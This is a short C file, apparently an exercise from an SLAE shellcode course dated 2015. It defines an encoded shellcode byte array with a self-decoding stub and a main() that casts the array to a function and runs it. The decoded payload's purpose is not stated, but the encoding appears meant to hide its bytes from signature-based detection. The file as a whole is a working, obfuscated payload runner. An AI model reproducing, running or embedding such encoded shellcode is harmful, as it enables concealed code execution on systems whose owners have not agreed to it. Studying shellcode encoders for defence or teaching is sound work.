// execute.c
// Author: Joris Hartog
// Date  : 23-11-2015
// St.nr.: SLAE-704

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x25\x5e\x31\xdb\x6a\x19\x59\x6a\x7b\x58\x89\xc2\x51\x89\xd9\xd3\xea\x80\xe2\x01\x74\x02\xf6\x16\x59\x46\x43\x80\xfb\x08\x75\x02\x31\xdb\xe2\xe6\xeb\x05\xe8\xd6\xff\xff\xff\xce\x3f\x50\x76\x1d\x97\xd0\x2f\x8c\x97\x68\xd0\x9d\x96\x91\x89\x1c\xaf\x53\x76\x1e\x4f\xf4\xcd\x7f";

void main() {
	printf("Shellcode length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
